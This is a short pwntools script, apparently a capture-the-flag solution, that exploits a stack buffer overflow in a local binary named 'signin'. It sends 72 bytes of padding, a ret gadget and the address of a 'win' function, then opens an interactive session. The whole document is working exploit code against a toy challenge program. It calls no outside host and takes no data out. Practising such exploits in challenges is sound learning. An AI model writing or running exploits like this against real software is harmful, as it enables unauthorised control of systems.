from pwn import*
context.log_level = "debug"
elf = ELF("./signin")
ret = 0x40101a
p = process("./signin")
p.sendlineafter(b"Enter your name: \n", b"a" * 72 + p64(ret) + p64(elf.sym["win"]))
p.interactive()
